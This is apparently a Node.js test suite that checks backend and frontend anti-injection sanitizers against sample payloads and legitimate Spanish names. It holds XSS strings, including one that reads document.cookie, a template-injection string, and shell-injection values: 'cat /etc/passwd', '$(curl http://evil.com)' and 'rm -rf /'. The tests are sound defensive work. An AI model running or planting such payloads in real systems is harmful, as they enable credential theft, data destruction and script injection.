import test from "node:test";
import assert from "node:assert/strict";
import {
  normalizeLine,
  sanitizeParagraph,
} from "../../api/_lib/security.js";
import {
  sanitizeLine as frontendSanitizeLine,
} from "../../src/utils/sanitizers.js";

test("Strict Anti-Injection: Backend & Frontend Sanitizers", async (t) => {
  await t.test("1. Strips HTML and Script tags and script blocks", () => {
    const malicious = "<script>alert('xss')</script>Juan Perez";
    assert.equal(normalizeLine(malicious), "Juan Perez");
    assert.equal(frontendSanitizeLine(malicious), "Juan Perez");

    const imgPayload = "Juan<img src=x onerror=alert(1)>Perez";
    assert.equal(normalizeLine(imgPayload), "Juan Perez");
    assert.equal(frontendSanitizeLine(imgPayload), "Juan Perez");
  });

  await t.test("2. Strips inline event handlers", () => {
    const malicious = 'test" onclick="alert(1)" style="color:red"';
    assert.equal(normalizeLine(malicious), 'test" style="color:red"');
  });

  await t.test("3. Strips javascript: and vbscript: pseudo-protocols", () => {
    const malicious = "Click here: javascript:alert(document.cookie)";
    assert.equal(normalizeLine(malicious), "Click here:");
  });

  await t.test("4. Strips Null bytes and dangerous invisible/bidi Unicode characters", () => {
    const nullPayload = "admin\0user";
    assert.equal(normalizeLine(nullPayload), "adminuser");

    const zeroWidthPayload = "admin\u200B\u200C\u200D\uFEFFuser";
    assert.equal(normalizeLine(zeroWidthPayload), "adminuser");
  });

  await t.test("5. Strips template injection delimiters", () => {
    const tplPayload = "Hello {{constructor.constructor('return this')()}} world";
    assert.equal(normalizeLine(tplPayload), "Hello constructor.constructor('return this')() world");
  });

  await t.test("6. Strips shell command injection patterns", () => {
    const backtickPayload = "Hello `cat /etc/passwd` world";
    assert.equal(normalizeLine(backtickPayload), "Hello world");

    const subshellPayload = "Hello $(curl http://evil.com) world";
    assert.equal(normalizeLine(subshellPayload), "Hello world");
  });

  await t.test("7. Preserves legitimate international characters and punctuation", () => {
    const legitimate = "María José Peña-García, Av. 10 de Agosto #45-B (Apto. 302)";
    assert.equal(normalizeLine(legitimate), "María José Peña-García, Av. 10 de Agosto #45-B (Apto. 302)");
    assert.equal(frontendSanitizeLine(legitimate), "María José Peña-García, Av. 10 de Agosto #45-B (Apto. 302)");
  });

  await t.test("8. Paragraph sanitizer preserves valid newlines while stripping malicious code", () => {
    const multiline = "Línea 1<script>bad()</script>\nLínea 2 `rm -rf /`\n\nLínea 3";
    const sanitized = sanitizeParagraph(multiline);
    assert.equal(sanitized, "Línea 1\nLínea 2\n\nLínea 3");
  });
});
